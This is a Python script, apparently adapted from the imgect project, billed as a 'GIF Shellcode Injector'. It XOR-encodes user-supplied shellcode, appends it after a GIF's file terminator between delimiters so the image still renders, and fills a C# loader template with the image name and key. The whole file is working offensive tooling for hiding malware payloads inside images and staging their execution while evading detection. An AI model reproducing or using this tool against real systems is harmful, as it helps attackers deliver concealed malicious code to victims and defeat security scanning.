"""
Modified version of: https://github.com/0xZDH/imgect
References: https://github.com/chinarulezzz/pixload/blob/master/bmp.pl
            https://github.com/Urinx/SomeCodes/blob/master/Python/others/bmp-js-injector.py
            https://github.com/jhaddix/scripts/blob/master/gif_header_xss.py
"""

import os
import sys
import string
import random
import base64
import hashlib
from argparse import ArgumentParser
from itertools import cycle


# == Helper Functions == #
def xor_crypt(data, key):
    ''' XOR encode data passed in with a specified key '''
    return bytes([d^k for d,k in zip(data, cycle(key))])

def prompt(question):
    ''' Prompt the user with a y/n question '''
    reply = str(input(question + ' [Y/n]: ') or "Y").lower().strip()

    # Default to 'Yes'
    if reply[0] == 'y' or reply == '':
        return True

    elif reply[0] == 'n':
        return False

    else:
        return prompt("Please enter")

def hexdump(src, length=16, sep='.'):
    ''' Hexdump - taken from https://gist.github.com/7h3rAm/5603718 '''
    # Build a list of printable characters, otherwise set as '.'
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])

    # Iterate over the source data
    lines  = []
    for c in range(0, len(src), length):
        # Get slice from source data - 16-bytes at a time
        chars = src[c:c+length]

        # Convert the 16 byte chunk to a hex string
        hexstr = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])

        if len(hexstr) > 24:
            hexstr = "%s %s" % (hexstr[:24], hexstr[24:])

        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or sep) for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
        lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexstr, printable))

    return '\n'.join(lines)


# == Image Functions == #

def gif_header_data():
    ''' Minimal GIF image data '''
    # GIF structure uses file terminator characters which allows
    # us to pack our shellcode in after the GIF file termination
    # without corrupting the image

    # Little-Endian
    # GIF Header (13 bytes)
    header  = b'\x47\x49\x46\x38\x39\x61'  # Signature and version  (GIF89a)
    header += b'\x0a\x00'                  # Logical Screen Width   (10 pixels)
    header += b'\x0a\x00'                  # Logical Screen Height  (10 pixels)
    header += b'\x00'                      # GCTF
    header += b'\xff'                      # Background Color       (#255)
    header += b'\x00'                      # Pixel Aspect Ratio

    # Global Color Table + Blocks (13 bytes)
    header += b'\x2c'                      # Image Descriptor
    header += b'\x00\x00\x00\x00'          # NW corner position of image in logical screen
    header += b'\x0a\x00\x0a\x00'          # Image width and height in pixels
    header += b'\x00'                      # No local color table
    header += b'\x02'                      # Start of image
    header += b'\x00'                      # End of image data
    header += b'\x3b'                      # GIF file terminator

    # Payload offset starts at: +31 (header bytes + enable script)

    return header


def bmp_header_data():
    ''' Minimal BMP image data '''
    # BMP structure uses explicit size values which allows
    # us to pack our shellcode in at the end of the image
    # file without corrupting the image

    # Little-Endian
    # BMP Header (14 bytes)
    header  = b'\x42\x4d'          # Magic bytes header       (`BM`)
    header += b'\x1e\x00\x00\x00'  # BMP file size            (30 bytes)
    header += b'\x00\x00'          # Reserved                 (Unused)
    header += b'\x00\x00'          # Reserved                 (Unused)
    header += b'\x1a\x00\x00\x00'  # BMP image data offset    (26 bytes)

    # DIB Header (12 bytes)
    header += b'\x0c\x00\x00\x00'  # DIB header size          (12 bytes)
    header += b'\x01\x00'          # Width of bitmap          (1 pixel)
    header += b'\x01\x00'          # Height of bitmap         (1 pixel)
    header += b'\x01\x00'          # Number of color planes   (1 plane)
    header += b'\x18\x00'          # Number of bits per pixel (24 bits)

    # BMP Image Pixel Array (4 bytes)
    header += b'\x00\x00\xff'      # Red, Pixel (0,1)
    header += b'\x00'              # Padding for 4 byte alignment

    # Payload offset starts at: +35 (header bytes + enable script)

    return header


def inject(payload, contents, xor_key, out_file):
    '''Inject shellcode into GIF image

    Keyword arguments:
        payload  -- shellcode to inject into image
        contents -- image data
        xor_key -- xor key
        out_file -- name of output image file
    '''

    # Open the image file
    f = open(out_file, "w+b")

    # Write the original image data
    f.write(contents)

    # Write `/////` as an offset identifier
    f.write(b'\x2f\x2f\x2f\x2f\x2f')

    # Write the xor key
    f.write(xor_key)

    # Write another delimiter
    f.write(b'\x2f\x2f\x2f\x2f\x2f')

    # Write the payload
    f.write(payload)

    # Write a final `;` to break up shellcode from
    # just going to EOF
    f.write(b'\x3b')

    # Close the file
    f.close()

def get_raw_sc(input_file):
    input_file = input_file
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
        return(file_shellcode)
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")


def build_template(gif, key):
    with open("gifloader_template.cs") as tplate:
        template = tplate.read()
        template = template.replace("###GIFNAME###", gif)
        template = template.replace("###KEY###", str(key))

    with open("gifloader.cs", "w") as outfile:
        outfile.write(template)


def main():

    parser  = ArgumentParser(description='GIF Shellcode Injector')

    # Image type
    parser.add_argument('-g', '--gif', type=str,
                         help='Inject into GIF image file')

    # Shellcode input type
    parser.add_argument('-i', '--input',
                        type=str, help='Payload file containing shellcode')

    # Misc.
    parser.add_argument('-o', '--output', type=str,
                        help='Output image file (Default: payload.gif)', default='payload')
    args = parser.parse_args()

    # -> Parse shellcode provided by the user
    if not (args.input and args.gif):
        parser.print_help()
        sys.exit()

    with open(args.input, 'r+b') as f:
        shellcode = f.read()

    # Generate XOR key
    xor_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    key = xor_key

    # Convert key to bytes
    xor_key = bytes([ord(c) for c in xor_key])

    # encrypt shellcode
    shellcode = xor_crypt(shellcode, xor_key)

    # -> Collect image data
    if args.output:
        out_file = args.output
    else:
        out_file = "payload.gif"

    # Make sure the output file has the correct image extension
    extension = 'gif'
    if out_file[-4:] != ('.' + extension):
        out_file += ('.' + extension)

    if os.path.exists(out_file):
        os.remove(out_file)

    contents = ''
    # If original GIF doesn't exist, populate with minimal header
    if not os.path.exists(args.gif):
        contents = gif_header_data()

    else:
        with open(args.gif, 'r+b') as f:
            contents = f.read()

    # Inject the shellcode into the image
    inject(shellcode, contents, xor_key, out_file)

    # build template
    build_template(out_file, xor_key)

    # print original shellcode
    original_shellcode = ''
    shellcode = get_raw_sc(args.input)
    for byte in shellcode:
        original_shellcode = original_shellcode + str(hex(byte).zfill(2)) + ", "
    original_shellcode = original_shellcode.rstrip(', ')
    print("Original shellcode:")
    print(original_shellcode)



if __name__ == '__main__':
    main()